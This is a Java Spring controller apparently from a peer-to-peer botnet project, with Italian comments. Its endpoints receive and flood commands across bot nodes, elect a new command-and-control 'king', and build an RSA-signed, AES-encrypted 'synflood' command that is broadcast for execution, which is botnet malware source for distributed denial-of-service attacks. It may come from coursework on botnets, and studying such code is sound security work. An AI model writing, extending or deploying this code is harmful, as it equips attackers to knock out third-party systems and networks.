package cs.sii.controller;

import java.security.InvalidKeyException;
import java.security.SecureRandom;
import java.security.SignatureException;
import java.util.Random;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import cs.sii.bot.action.Auth;
import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.domain.IP;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;

//Controller del Bot che gestisce le richieste della rete P2P dei Bot 

@Component
@RestController
@RequestMapping("/bot")
public class BotController {

	@Autowired
	Config engineBot;

	@Autowired
	Auth auth;

	@Autowired
	CryptoPKI pki;

	@Autowired
	Behavior bhv;

	@Autowired
	NetworkService nServ;

	@RequestMapping("/")
	public String index() {
		return "Bot is Ready";
	}

	@RequestMapping(value = "/flood", method = RequestMethod.POST)
	public Boolean msgFlood(@RequestBody String msg,HttpServletRequest req) {
		
		IP ip=new IP(req.getRemoteAddr());
		bhv.floodAndExecute(msg,ip);
		return true;
	}

	@RequestMapping("/newKing")
	public Boolean newKing(HttpServletRequest req) {
		if (nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {

			// TODO scegliere quello giusto
			System.out.println("addr: " + req.getRemoteAddr());
			System.out.println("host: " + req.getRemoteHost());

			bhv.getPower(req.getRemoteAddr());
			return true;
		} else {
			System.out.println("not elegible or already elected");
			return false;
		}
	}

	@RequestMapping("/ping")
	public Boolean ping() {

		// per efficienza chiamo un metodo asincrono e rispondo che ho ricevuto
		// il msg
		// tutto il resto avviene nella in Flood&Execute

		String cmd = "synflood";
		String msg = "";
		// aggiungi nonce time.millis
		Long milli = System.currentTimeMillis();

		Random rand = new SecureRandom(milli.toString().getBytes());
		Integer nounce = rand.nextInt();

		String hashIdMsg = pki.getCrypto().generateSha256(nounce.toString());

		String signature;
		try {
			signature = pki.signMessageRSA(hashIdMsg);
			System.out.println("signature originale " + signature);
			msg = hashIdMsg + "<HH>" + cmd + "<HH>" + signature;
			System.out.println("msg originale " + msg);
			msg = pki.getCrypto().encryptAES(msg);
			System.out.println("raw originale " + msg);
		} catch (InvalidKeyException | SignatureException e) {
			e.printStackTrace();
			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
		}

		bhv.floodAndExecute(msg,nServ.getMyIp());
		return true;
	}

}
